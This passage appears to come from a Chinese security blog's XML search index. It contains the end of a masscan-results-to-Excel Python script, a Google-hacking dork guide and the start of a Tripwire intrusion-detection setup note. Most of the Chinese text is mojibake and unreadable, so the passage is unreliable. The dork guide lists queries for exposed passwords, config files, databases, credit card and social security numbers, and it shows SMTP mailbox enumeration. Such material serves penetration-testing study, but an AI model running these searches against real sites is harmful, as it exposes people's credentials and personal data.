open(filepath,encoding='utf-8') c = json.load(f) list = [] for i in c: ip = i['ip'] port = str(i['ports'][0]['port']) status = 'open' try: if i['ports'][0]['service']: name = i['ports'][0]['service']['name'] banner = str(i['ports'][0]['service']['banner']) except: name = '' banner = '' line = [ip,port,status,name,banner] list.append(line) return list def quchong(l1): l2 =[] for data1 in l1: for data2 in l1: if data1[0]==data2[0] and data1[1]==data2[1]: if data1[3] ==''and data2[3] !='': # print(data1,data2) l2.append(data1) for i in l2: try: l1.remove(i) except:pass l1 = [list(t) for t in set(tuple(_) for _ in l1)] return l1 def write_excle(list): f = xlsxwriter.Workbook('port.xlsx') worksheet1 = f.add_worksheet('æ‰«æä¿¡æ¯') worksheet2 = f.add_worksheet('ä¸»æœºipåˆ—è¡¨') worksheet1.write(0, 0, 'ip') worksheet1.write(0, 1, 'ç«¯å£') worksheet1.write(0, 2, 'çŠ¶æ€') worksheet1.write(0, 3, 'æœåŠ¡') worksheet1.write(0, 4, 'banner') worksheet2.write(0, 0, 'ä¸»æœºip') newlist= [] for i in list: newlist.append(i[0]) newlist=set(newlist) total1 = 0 total2 = len(newlist) newlist=sorted(newlist, key=socket.inet_aton) for index, p in enumerate(list): total1+=1 for j, q in enumerate(p): worksheet1.write(index + 1, j, q) for index, p in enumerate(newlist): worksheet2.write(index + 1, 0, p) f.close() return total1,total2 if __name__ == '__main__': filepath = 'C:/1/result.json' #å¡«å†™è¦è§£æmasscanæ‰«æjsonæ ¼å¼æŠ¥å‘Šçš„æ–‡ä»¶è·¯å¾„ result = get_list(filepath) result = quchong(result) sum = write_excle(result) print('å…±æ£€æµ‹åˆ°å­˜æ´»ä¸»æœº%dä¸ªï¼Œç«¯å£ä¿¡æ¯%dæ¡'% (sum[1],sum[0])) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>ç«¯å£æ‰«æ</tag>
        <tag>ä¿¡æ¯æœé›†</tag>
        <tag>masscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google Hacking]]></title>
    <url>%2Fposts%2F3409%2F</url>
    <content type="text"><![CDATA[åŸºæœ¬é€šé…ç¬¦ é€šé…ç¬¦ è¯­ä¹‰ è¯´æ˜ ç¤ºä¾‹ + åŒ…å«å…³é”®è¯ +å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼ admin +login - æ’é™¤å…³é”®è¯ -å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼ mysql -csdn ~ åŒä¹‰è¯ ~å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼ mysql -csdn * æ¨¡ç³ŠæŸ¥è¯¢ *ä»£æ›¿ä»»æ„å­—ç¬¦ mysql** "" å¼ºè°ƒ "mysql" é«˜çº§æ“ä½œç¬¦æ¦‚è¿°å°†å­¦ä¹ å¦‚ä¸‹çš„é«˜çº§æ“ä½œç¬¦ï¼š intitle, allintitle related inurl, allinurl phonebook filetype rphonebook allintext bphonebook site author link group inanchor msgid daterange insubject cache stocks info define æ“ä½œç¬¦è¯­æ³•åŸºæœ¬è¯­æ³•ï¼šoperator:search_term åŸåˆ™ åœ¨æ“ä½œç¬¦ã€å†’å·ã€æœç´¢å…³é”®å­—ä¹‹é—´æ˜¯æ²¡æœ‰ç©ºæ ¼çš„ï¼› å¸ƒå°”æ“ä½œç¬¦å’Œç‰¹æ®Šå­—ç¬¦(ä¾‹å¦‚ORå’Œ+)ä»å¯ç”¨äºé«˜çº§æ“ä½œç¬¦æŸ¥è¯¢ï¼Œä½†æ˜¯ä¸èƒ½æŠŠå®ƒä»¬æ”¾åœ¨å†’å·ä¹‹å‰è€ŒæŠŠå†’å·å’Œæ“ä½œç¬¦åˆ†å¼€ï¼› ALLæ“ä½œç¬¦(ä»¥å•è¯ALLå¼€å¤´çš„æ“ä½œç¬¦)éå¸¸å¤æ€ªã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæŸ¥è¯¢ä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡ALLæ“ä½œç¬¦ï¼Œè€Œä¸”ä¸èƒ½å’Œå…¶ä»–æ“ä½œç¬¦æ··ç”¨ï¼› æ“ä½œç¬¦æœç´¢çš„æœç´¢å…³é”®å­—éƒ¨åˆ†çš„è¯­æ³•å’Œå‰ä¸€ç« ä¸­è®²åˆ°çš„å…³é”®å­—è¯­æ³•æ˜¯ä¸€æ ·çš„ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå•è¯æˆ–è€…ç”¨å¼•å·å¼•èµ·æ¥çš„è¯ç»„ä½œä¸ºå…³é”®å­—ã€‚å¦‚æœç”¨è¯ç»„ä½œä¸ºå…³é”®å­—çš„è¯ï¼Œé¡»ä¿è¯åœ¨æ“ä½œç¬¦ã€å†’å·å’Œè¯ç»„çš„ç¬¬ä¸€ä¸ªå¼•å·ä¹‹é—´æ²¡æœ‰ä»»ä½•ç©ºæ ¼å­—ç¬¦ã€‚ å®ä¾‹ intitle:Googleè¿™ä¸ªæŸ¥è¯¢å°†è¿”å›æ ‡é¢˜åŒ…å«å•è¯Googleçš„é¡µé¢ã€‚ intitle:"index of"è¿™ä¸ªæŸ¥è¯¢å°†è¿”å›æ ‡é¢˜åŒ…å«è¯ç»„index ofçš„é¡µé¢ã€‚å›å¿†å‰ä¸€ç« ä¸­å­¦åˆ°çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªæŸ¥è¯¢ä¹Ÿå¯ä»¥å†™æˆ intitle:index.of,å› ä¸ºå¥å·å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ã€‚åˆ©ç”¨è¿™ç§æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…é”®å…¥è¯ç»„ä¸­çš„ç©ºæ ¼ä»¥åŠä¸¤ç«¯çš„å¼•å·ã€‚â€ intitle:"index of" private è¿™ ä¸ªæŸ¥è¯¢å°†è¿”å›æ ‡é¢˜åŒ…å«è¯ç»„index of,ä¸”ç½‘é¡µçš„ä»»ä½•åœ°æ–¹(URLã€æ ‡é¢˜ã€æ–‡æœ¬ç­‰)åŒ…å«å•è¯privateçš„é¡µé¢ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œintitle åªå¯¹è¯ç»„index ofèµ·ä½œç”¨ï¼Œè€Œä¸ä¼šå½±å“å•è¯private,è¿™æ˜¯å› ä¸ºå¼•å·å¤–çš„ç¬¬ä¸€ä¸ªç©ºæ ¼ä½äºè¯ç»„index ofä¹‹åã€‚GoogleæŠŠè¿™ä¸ªç©ºæ ¼è§£é‡Šä¸ºé«˜çº§æ“ä½œç¬¦æœç´¢å…³é”®å­—çš„ç»“å°¾ï¼Œç„¶åæ¥ç€å¤„ç†æŸ¥è¯¢ä¸­å‰©ä¸‹çš„éƒ¨åˆ†ã€‚ intitle:"index of" "bakcup files"è¿™ ä¸ªæŸ¥è¯¢è¿”å›æ ‡é¢˜åŒ…å«è¯ç»„index of,ä¸”ç½‘é¡µçš„ä»»ä½•åœ°æ–¹(URLã€æ ‡é¢˜ã€æ–‡æœ¬ç­‰)åŒ…å«è¯ç»„backup filesçš„ é¡µé¢ã€‚åŒæ ·è¦æ³¨æ„åˆ°intitleä»…å¯¹è¯ç»„index ofèµ·ä½œç”¨ã€‚ æ­£æ–‡Intitle ä¸ Allintitle ï¼šåœ¨é¡µé¢æ ‡é¢˜ä¸­æœç´¢psï¼šåªæœ‰åœ¨å•è¯intitleåé¢çš„å•è¯æˆ–è¯ç»„æ‰è¢«è®¤ä¸ºæ˜¯æŸ¥è¯¢å…³é”®å­—ï¼Œè€ŒAllintitleæ²¡æœ‰è¿™ä¸€è§„åˆ™ ä¾‹å¦‚ï¼š intitle:"index of" "backup files" Allintitle:"index of" "backup files" æ¯ä¸ªé“¾æ¥çš„æ–‡æ¡£æ ‡é¢˜ä¸­éƒ½æ‰¾åˆ°äº†ä¸¤ä¸ªè¯ï¼Œæ›´ç²¾ç¡® æ…é‡ä½¿ç”¨allintitleæ“ä½œç¬¦ã€‚åœ¨å’Œå…¶ä»–é«˜çº§æ“ä½œç¬¦ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå®ƒå°±æ˜¾å¾—éå¸¸ç¬¨æ‹™ï¼Œè€Œä¸”ä¼šæ‰“ä¹±æ•´ä¸ªæŸ¥è¯¢ï¼Œä½¿å¾—æ— æ³•å¾—åˆ°ç»“æœã€‚ä¹Ÿè®¸æœ‰äº›æç«¯ï¼Œä½†æ˜¯å³ä¾¿åœ¨ä¸€æ¬¡æŸ¥è¯¢ä¸­ä½¿ç”¨ä¸€-ä¸²intitleä¹Ÿå¥½è¿‡ä½¿ç”¨æ‹™åŠ£çš„allintitle. intext ä¸ Allintext ï¼šåœ¨ç½‘é¡µå†…å®¹é‡ŒæŸ¥æ‰¾å­—ç¬¦ä¸²ç”±äºè¿™ä¸ªæ“ä½œç¬¦æ˜¯ä»¥å•è¯allå¼€å¤´çš„ï¼Œæ‰€ä»¥åœ¨å®ƒä¹‹åçš„æ¯ä¸ªæœç´¢å…³é”®å­—éƒ½å°†ä½œä¸ºæŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†ã€‚ åŸºäºè¿™ä¸ªåŸå› ï¼Œalintextæ“ä½œç¬¦ä¸èƒ½å’Œå…¶ä»–çš„é«˜çº§ç¬¦æ··åˆä½¿ç”¨ã€‚ Inurl ä¸ Allinurl ï¼šåœ¨URLä¸­æŸ¥æ‰¾æ–‡æœ¬Site ï¼šæŠŠæœç´¢ç²¾ç¡®åˆ°ç‰¹å®šçš„ç«™ç‚¹æ³¨æ„ï¼šGoogleæ˜¯ä»å·¦åˆ°å³è¯»å–æœåŠ¡å™¨åçš„ Filetype ï¼šæœç´¢æŒ‡å®šç±»å‹çš„æ–‡ä»¶filetype:pdf å¸¸è§çš„æ–‡ä»¶æ‹“å±•åï¼š pdf ps wk1, wk2, wk3, wk5, wki, wks, wku Lwp Mw Xls Ppt Doc wks, wps, wdb Wri Rtf Swf ans, txt html htm php asp cfm aspx jsp CGI DO PL XML DOC PHTML PHP3 TXT EXE XLS PPT æç¤ºï¼šextæ“ä½œç¬¦å¯ä»¥ç”¨æ¥æ›¿ä»£filetype. filetye:xlsæŸ¥ è¯¢ä¸ext:xIsç­‰ä»·ã€‚ Link ï¼šæœç´¢ä¸å½“å‰ç½‘é¡µå­˜åœ¨é“¾æ¥çš„ç½‘é¡µlink:www.baidu.com Inanchor ï¼šåœ¨é“¾æ¥æ–‡æœ¬ä¸­æŸ¥æ‰¾æ–‡æœ¬å¯ä»¥å’Œlinkæ“ä½œç¬¦ç›¸æ¯”è¾ƒä½¿ç”¨ï¼Œå› ä¸ºéƒ½èƒ½ç”¨æ¥æœç´¢é“¾æ¥ã€‚ä½†æ˜¯inachoræ“ ä½œç¬¦æœç´¢çš„æ˜¯ä¸€ä¸ªé“¾æ¥çš„æ–‡æœ¬è¡¨ç¤ºï¼Œè€Œä¸æ˜¯å®é™…çš„URL ã€‚ inanchor æ“ä½œç¬¦æœç´¢çš„æ˜¯é”šç‚¹ï¼Œæˆ–è€…è¯´æ˜¯é“¾æ¥ä¸Šæ˜¾ç¤ºçš„æ–‡æœ¬ Cache ï¼šæ˜¾ç¤ºç½‘é¡µçš„ç¼“å­˜ç‰ˆæœ¬Numrange ï¼šæœç´¢æ•°å­—numrangæ“ä½œç¬¦éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æœ€å°æ•°ï¼Œä¸€ä¸ªæ˜¯æœ€å¤§æ•°ï¼Œä»¥ç ´æŠ˜å·åˆ†éš”ã€‚ ä¾‹å¦‚ï¼ŒæŸ¥æ‰¾12345ï¼šnumrange:12344-12346æˆ–ç®€å†™12344..12346 Daterange ï¼šæŸ¥æ‰¾åœ¨æŸä¸ªç‰¹å®šæ—¥æœŸèŒƒå›´å†…å‘å¸ƒçš„ç½‘é¡µè¿™ä¸ªæ“ä½œç¬¦çš„å‚æ•°é€šå¸¸ä¹Ÿå¿…é¡»è¡¨ç¤ºä¸ºä¸€ä¸ªèŒƒå›´ï¼Œå³ç”¨ç ´æŠ˜å·åˆ†å¼€çš„ä¸¤ä¸ªæ—¥æœŸã€‚å¦‚æœä½ åªæƒ³æŸ¥æ‰¾æŸä¸ªç‰¹å®šæ—¥æœŸç´¢å¼•çš„ç½‘é¡µï¼Œå¿…é¡»æä¾›åŒæ ·çš„æ—¥æœŸä¸¤æ¬¡ï¼Œå¹¶ä»¥ç ´æŠ˜å·åˆ†å¼€ã€‚ Info ï¼šæ˜¾ç¤ºGoogleçš„æ‘˜è¦ä¿¡æ¯è¯¥æ“ä½œç¬¦çš„å‚æ•°å¿…é¡»æ˜¯: ä¸€ä¸ªæœ‰æ•ˆçš„URLæˆ–è€…ç½‘ç«™åã€‚ Related ï¼šæ˜¾ç¤ºç›¸å…³ç«™ç‚¹Author ï¼šæœç´¢Groupsä¸­æ–°é—»ç»„å¸–å­çš„ä½œè€…Group ï¼šæœç´¢Groupæ ‡é¢˜å¯ä»¥ç”¨æ¥åœ¨Google Groupså¸–å­çš„æ ‡é¢˜ä¸­æœç´¢å«æœ‰å…³é”®å­—çš„å¸–å­ã€‚ groupæ“ä½œç¬¦å¹¶ä¸èƒ½å¾ˆå¥½åœ°å’Œå…¶ä»–æ“ä½œç¬¦æ··åˆä½¿ç”¨ã€‚ Insubject ï¼šæœç´¢Google Groupä¸»é¢˜è¡Œinsubjectæ“ä½œç¬¦å®é™…ä¸Šå’Œintitleæœç´¢æ˜¯ä¸€æ ·çš„ï¼Œå®ƒä»¬è¿”å›åŒæ ·çš„ç»“æœã€‚ as_Msgid ï¼šé€šè¿‡æ¶ˆæ¯IDæ¥æŸ¥æ‰¾Groupå¸–å­Stocks ï¼šæœç´¢è‚¡ç¥¨ä¿¡æ¯è¿™ä¸ªæ“ä½œç¬¦çš„å‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„è‚¡ç¥¨ç®€ç§° stocksæ“ä½œç¬¦ä¸èƒ½å’Œå…¶ä»–çš„æ“ä½œç¬¦ åŠæœç´¢å…³é”®å­—åŒæ—¶ä½¿ç”¨ã€‚ Define ï¼šæ˜¾ç¤ºæŸä¸ªæœ¯è¯­çš„å®šä¹‰ defineæ“ä½œç¬¦ä¸èƒ½å’Œå…¶ä»–æ“ä½œç¬¦æˆ–æœç´¢å…³é”®å­—æ··åˆä½¿ç”¨ã€‚ Phonebook ï¼šæœç´¢ç”µè¯åˆ—è¡¨phonebookæ“ä½œç¬¦å¯ä»¥ç”¨æ¥æœç´¢å•†ä¸šå’Œä½å®…ç”µè¯åˆ—è¡¨ã€‚ ä¾‹å¦‚ï¼šphonebook: john nyæ˜¯johbåœ¨ view ï¼šä»¥ä»€ä¹ˆå½¢å¼å±•ç¤ºåœ¨WebæŸ¥è¯¢çš„ç»“å°¾æ”¾ä¸Šview:mapæˆ–è€…yview:timelineï¼Œä»¥ä¾¿åœ¨åœ°å›¾è§†å›¾æˆ–è€…ä¸€ä¸ªé…·é…·çš„æ—¶é—´è½´è§†å›¾ä¸­æŸ¥çœ‹ç»“æœã€‚ å…¶ä»–æ“ä½œç¬¦ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ æ“ä½œç¬¦çš„æ··åˆä½¿ç”¨ åŸºç¡€ä½¿ç”¨ç¼“å­˜è¿›è¡ŒåŒ¿åæµè§ˆå¯ä»¥å®ç°åŒ¿åæµè§ˆï¼Œå¦‚æœé…åˆä»£ç†æœåŠ¡å™¨æ•ˆæœæ›´å¥½ï¼šé€šè¿‡è¯­æ³•æŸ¥æ‰¾inurl:"nph-prxy.cgi "start browsing"ç­‰ é€‰é¡¹cached text onlyå…¶å®æ˜¯æ·»åŠ äº†æ¢ä¸€ä¸ª&amp;strip=1å‚æ•°ï¼Œå¼ºåˆ¶åªæ˜¾ç¤ºç¼“å­˜æ–‡æœ¬ï¼Œç¦æ­¢ä»»ä½•å¤–éƒ¨å¼•ç”¨ Googleçš„ç¼“å­˜ç‰ˆæœ¬é¡µé¢ä¼šå¯¹æœç´¢å…³é”®å­—è¿›è¡Œé«˜äº®æ˜¾ç¤ºã€‚ä½†æ˜¯ä½ å¯èƒ½è¿˜ä¸çŸ¥é“å¯ä»¥ä½¿ç”¨Googleçš„é«˜äº®å·¥å…·åœ¨ç¼“å­˜ç½‘é¡µä¸­é«˜äº®æ˜¾ç¤ºæŸäº›å¹¶ä¸åŒ…å«åœ¨åŸå§‹æœç´¢ä¸­çš„å…³é”®å­—ã€‚ ç›®å½•åˆ—è¡¨æŸ¥æ‰¾ç›®å½•åˆ—è¡¨ï¼šintitle:"index.of" "parent directory" å…¶ä¸­.æ˜¯é€šé…ç¬¦ æŸ¥æ‰¾ç‰¹å®šç›®å½•ï¼šintitle:index.of.adminæˆ–intitle:index.of inurl:admin æŸ¥æ‰¾ç‰¹å®šçš„æ–‡ä»¶ï¼šfiletype:log inurl:ws_ftp.logï¼Œä½¿ç”¨filetypeå’Œinurlæ¥æŸ¥æ‰¾ æœåŠ¡å™¨ç‰ˆæœ¬ï¼šintitle:index.of server at æœåŠ¡å™¨ç‰ˆæœ¬ï¼šintitle:index.of Apache/1.3.24 Server at ç­‰ï¼ˆå…¶ä»–æœåŠ¡å™¨â€¦ï¼‰ æœç´¢ç›®æ ‡æ˜¯å¦æœ‰åˆ—ç›®å½• site:"xpshuai.cn" intext:index of/ | ../ | Parent Directory éå†ç›®å½•éå†ï¼šintitle:index.of inurl:"/admin/"å’Œintitle:index.of inurl:"/var/www/"ç­‰ç­‰ é€’å¢ç½®æ¢ï¼ˆâ€œå–ä¸€ä¸ªæ•°å¹¶ç”¨ä¸‹ä¸€ä¸ªæ›´å¤§çš„æˆ–è€…æ›´å°çš„æ•°æ¥æ›¿ä»£è¿™ä¸ªæ•°â€çš„å½¢è±¡çš„è¯´æ³•ï¼‰ æ‹“å±•éå†ï¼ˆç”¨äºæŸ¥æ‰¾æ–‡ä»¶åç›¸åŒï¼Œä½†æ˜¯æ‹“å±•åä¸åŒçš„æ–‡ä»¶å¦‚å¤‡ä»½æ–‡ä»¶â€“&gt;ä¸€æ—¦ä½ æ‰¾åˆ°äº†HTMæ–‡ä»¶ï¼Œå°±å¯ä»¥åº”ç”¨ç½®æ¢æŠ€æœ¯æ¥æŸ¥æ‰¾å…·æœ‰ç›¸åŒçš„æ–‡ä»¶åï¼Œä½†æ‰©å±•åä¸åŒçš„æ–‡ä»¶ï¼‰ æ–‡æ¡£åŠ å·¥ä¸æ•°æ®åº“æŒ–æ˜é…ç½®æ–‡ä»¶inurl:conf OR inurl:config OR inurl:cfg Googleé»‘å®¢åœ¨æœç´¢é…ç½®æ–‡ä»¶æ—¶å¸¸è€ƒè™‘çš„å‡ ç‚¹ï¼šâ—ä½¿ç”¨å¯ç”¨çš„é…ç½®æ–‡ä»¶ä¸­ç‰¹æœ‰çš„å•è¯æˆ–è¯ç»„æ¥åˆ›å»ºä¸€ä¸ªå¼ºå¤§çš„åŸºæœ¬æœç´¢ã€‚â—è¿‡æ»¤æ‰sample. exampleã€ test. howtoå’Œtutorialå• è¯ä»¥å‰”é™¤æ˜æ˜¾çš„ç¤ºä¾‹æ–‡ä»¶ã€‚å‡5 6 smâ—ç”¨-cvsè¿‡æ»¤æ‰CVSå­˜å‚¨å™¨ï¼Œå®ƒä»¬é€šå¸¸å­˜æ”¾äº†é»˜è®¤çš„é…ç½®æ–‡ä»¶ã€‚â—å¦‚æœæ˜¯æœç´¢UNIXç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±è¦è¿‡æ»¤æ‰manpageæˆ–è€…Manualï¼ˆ-manpageï¼‰â—æœç´¢ç¤ºä¾‹é…ç½®æ–‡ä»¶ä¸­æœ€å¸¸æ”¹å˜çš„åŸŸï¼Œå¹¶ä¸”å¯¹è¯¥åŸŸæ‰§è¡Œç¼©ç®€æœç´¢ï¼Œä»¥å‰”é™¤å¯èƒ½çš„â€œåƒåœ¾â€æˆ–è€…æ ·ä¾‹æ–‡ä»¶ã€‚ å¸¸è§çš„é…ç½®æ–‡ä»¶æœç´¢ç¤ºä¾‹ï¼š æ—¥å¿—æ–‡ä»¶ä¾‹å¦‚ï¼šfiletype:log username putty Officeæ–‡æ¡£æœç´¢å¯èƒ½æ•æ„Ÿçš„Officeæ–‡æ¡£çš„æŸ¥è¯¢æ ·ä¾‹ï¼š æ•°æ®åº“æŒ–æ˜ç™»å½•å…¥å£ä¸ç®¡ç™»å½•å…¥å£çš„å®‰å…¨å¼ºå¼±ç¨‹åº¦å¦‚ä½•ï¼Œå®ƒçš„å­˜åœ¨éƒ½æš´éœ²äº†ç›®æ ‡å¯èƒ½ä½¿ç”¨çš„è½¯ä»¶å’Œç¡¬ä»¶çš„ç±»å‹ã€‚ç®€å•æ¥è¯´ï¼Œç™»å½•å…¥å£éå¸¸é€‚åˆäºé¡ºè—¤æ‘¸ç“œã€‚ å¸®åŠ©æ–‡ä»¶é”™è¯¯æ¶ˆæ¯ æ•°æ®åº“è½¬å‚¨ å®é™…çš„æ•°æ®åº“æ–‡ä»¶å¦‚ï¼šfiletype"mdb inurl:user.mdb å…¶ä»–ä¿¡æ¯æœç´¢ç¡®å®šE-mailåœ°å€1.æŸ¥æ‰¾é‚®ä»¶æœåŠ¡å™¨ï¼šhost -t mx qq.com ã€ Windowsä¸Šï¼šnslookup -Cqtype=mx qq.com 2.æŒ‘é€‰å‡ºä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¹¶ä¸”è¿œç¨‹ç™»å½•åˆ°ç«¯å£25ï¼štelnet mx1.qq.com 25 3.ä¼ªè£…ç®€å•é‚®ä»¶ä¼ é€åè®®(SMTP) 4.æ­£é¢æµ‹è¯• 5.åé¢æµ‹è¯• 6.å®Œæˆï¼Œå¯ä»¥ç¡®å®šæŸä¸ªé‚®ç®±å­˜åœ¨ ç¡®å®šç”µè¯å·ç é€šè¿‡Googleçš„æ•°å­—èŒƒå›´(numrange)æ“ä½œç¬¦åœ¨ä¸€ä¸ªç‰¹å®šçš„èŒƒå›´å†…æŸ¥æ‰¾åŒ…å«çš„ç”µè¯å·ç  å…ˆæŒ‡å®šèµ·å§‹æ•°å­—ï¼Œæ¥ç€é”®å…¥..ï¼Œå†é”®å…¥ç»ˆæ­¢æ•°å­—ã€‚ ç¡®å®šäººç‰¹æ®Šçš„æ“ä½œç¬¦filetype:ppt site:www.****.gov æœç´¢expä¸æŸ¥æ‰¾ç›®æ ‡æœç´¢å…¬å¼€çš„expç«™ç‚¹å¦‚ï¼šfiletype:c exploit ç„¶ååˆ†ç¦»urlï¼šgrep cached exp |awk-F "-" '{print $1}'| sort -u é€šè¿‡å¸¸è§ä»£ç å­—ç¬¦ä¸²æœç´¢expåˆ©ç”¨Googleä»£ç æœç´¢æŸ¥æ‰¾ä»£ç æœç´¢æ¶æ„è½¯ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶åˆ©ç”¨æºä»£ç æœç´¢ç›®æ ‡ç®€å•æœ‰æ•ˆçš„å®‰å…¨æ€§æœç´¢ error | warning login | logon username |userid |employee.ID | "your username is" password | "your password is" site:edu.cn # -ext å¿…é¡»å’Œsiteä¸€èµ·ç”¨ site:edu.cn -ext:html # æ’é™¤htmlçš„æ–‡ä»¶ç±»å‹ # ä¸´æ—¶æ–‡ä»¶ã€å¤‡ä»½ç›®å½• inurl:tmp | inurl:temp | inurl:backup | inurl:bak è·Ÿè¸ªæœç´¢WebæœåŠ¡å™¨ã€ç™»å½•å…¥å£å’Œç½‘ç»œç¡¬ä»¶å®šä½å¹¶å‰–æWebæœåŠ¡å™¨1.ç›®å½•åˆ—è¡¨ 2.WebæœåŠ¡å™¨è½¯ä»¶çš„é”™è¯¯æ¶ˆæ¯ 3.é»˜è®¤æ–‡æ¡£ 4.ç¤ºä¾‹ç¨‹åº ç”¨æˆ·åã€å£ä»¤å’Œå…¶ä»–ç§˜å¯†ä¿¡æ¯æœç´¢ç”¨æˆ·å æœç´¢å£ä»¤ ä¿¡ç”¨å¡è´¦å· ç¤¾ä¿å·ç  ä¸ªäººè´¢åŠ¡æ•°æ® document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>Google hacking</tag>
        <tag>æœç´¢å¼•æ“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-å…¥ä¾µæ£€æµ‹IDS]]></title>
    <url>%2Fposts%2F35785%2F</url>
    <content type="text"><![CDATA[å…¥ä¾µæ£€æµ‹(IDS) å®‰å…¨çš„å…³é”®åœ¨äºçœ‹è§ å…¥ä¾µæ£€æµ‹( Intrusion Detection System ) è®¾å¤‡æˆ–è€…è½¯ä»¶ï¼Œ ç”¨äºç›‘è§†ç½‘ç»œå’Œç³»ç»Ÿçš„æ¶æ„ã€è¿è§„è¡Œä¸º åŸºäºç‰¹å¾ã€åŸºäºå¼‚å¸¸(æµé‡å¼‚å¸¸ï¼Œè¡Œä¸ºå¼‚å¸¸..)ã€åŸºäºä¿¡èª‰(ä¾èµ–æœºå™¨å­¦ä¹ ) åŸºäºç½‘ç»œçš„å…¥ä¾µæ£€æµ‹ NIDS åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ HIDS (å¸¸ç”¨çš„æ–¹æ³•ï¼šæ£€æŸ¥ç³»ç»Ÿæ–‡ä»¶çš„å®Œæ•´æ€§) å‘Šè­¦è€Œéå®æ—¶é˜»æ–­(è”åŠ¨å…¶ä»–æ‰‹æ®µå®ç°é˜»æ–­) ç›‘è§†å’Œè­¦å‘Šæ–‡ä»¶/ç›®å½•çš„å˜æ›´ IPS(å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ) / IDPï¼ˆå…¥ä¾µæ£€æµ‹é˜²å¾¡ç³»ç»Ÿï¼‰ Tripwire(ç»Šç½‘) å¼€æºå…è´¹çš„å®‰å…¨å’Œæ•°æ®å®Œæ•´æ€§æ£€æµ‹åŠå‘Šè­¦è½¯ä»¶(æœ‰ä¼ä¸šç‰ˆ) Tripwire å…¬å¸ å†›äº‹å’Œå·¥ä¸šé¢†åŸŸ Tripwire åŸºäºæ–‡ä»¶å®Œæ•´æ€§æ£€æŸ¥çš„HIDS å¯¹å…¨æ–°å®‰è£…çš„ç³»ç»Ÿåˆ›å»ºåŸºçº¿åº“ åŸºäºç­–ç•¥ç”ŸæˆåŸºçº¿å’Œæ£€æŸ¥æŒ‡å®šæ–‡ä»¶ç›®å½•çš„æŒ‡å®šå±æ€§(HASHã€ Permã€Owner) å®‰è£… sudo apt-get install tripwire # åŒæ—¶ä¼šæç¤ºä½ å®‰è£…Postfix # è¦æ±‚ä½ è®¾ç½®å¯†ç æ–‡ï¼ˆä¸¤ä¸ªå¯†é’¥å¯¹ å¯¹æ–‡ä»¶å®Œæ•´æ€§åšç­¾åï¼‰ # site key ä¸€ç»„æœåŠ¡å™¨ä¸»æœº ç›¸åŒçš„site keyï¼Œé€‚ç”¨äºé‡å¤ä½¿ç”¨ # local key åªé’ˆå¯¹æˆ‘æœ¬æœºçš„æ–‡ä»¶åŠ å¯†çš„æƒ…æ™¯ # é…ç½®æ–‡ä»¶ä¼šä»¥keyåŠ å¯†æ–¹å¼ä¿å­˜çš„ï¼Œå¦‚æœæƒ³ä¿®æ”¹å¯ä»¥ä¿®æ”¹/etc/tripwire/twcfg.txtç„¶åæ‰§è¡Œå‘½ä»¤æ¥å®ç° # è¦ç›‘è§†çš„æ–‡ä»¶ç›®å½•çš„ç­–ç•¥æ–‡ä»¶ï¼š/etc/tripwire/twpol.txt æ–‡ä»¶ç»“æ„ ls /etc/tripwire site.key xps-local.key tw.cfg # åŠ äº†å¯†çš„ twcfg.txt # é…ç½®æ–‡ä»¶ã€‚ tw.pol twpol.txt # ç­–ç•¥æ–‡ä»¶ã€‚rulename ç­–ç•¥å # å…¶ä¸­å˜åŒ–å¾ˆå¤§çš„æ–‡ä»¶è¦æ ¹æ®æƒ…å†µæ¥è¿›è¡Œç›‘æ§ # å¯ä»¥åœ¨ç­–ç•¥æ–‡ä»¶ï¼Œè‡ªå·±æ·»åŠ æ–°çš„è§„åˆ™ åˆå§‹åŒ–æ•°æ®åº“ ls /var/ib/tripwire/ # å­˜æ”¾æ–‡ä»¶å®Œæ•´æ€§çš„æ•°æ®åº“ sudo tripwire --init # è¦å…ˆè¿›è¡Œæ•°æ®åº“åˆå§‹åŒ– No such file or directory # ä¼šæœ‰è¿™ä¸ªæç¤ºä¿¡æ¯ï¼ŒErrorå°±ä¸æ­£å¸¸äº†ï¼ˆæœ‰çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼‰ vi /etc/tripwire/twpol.txt # 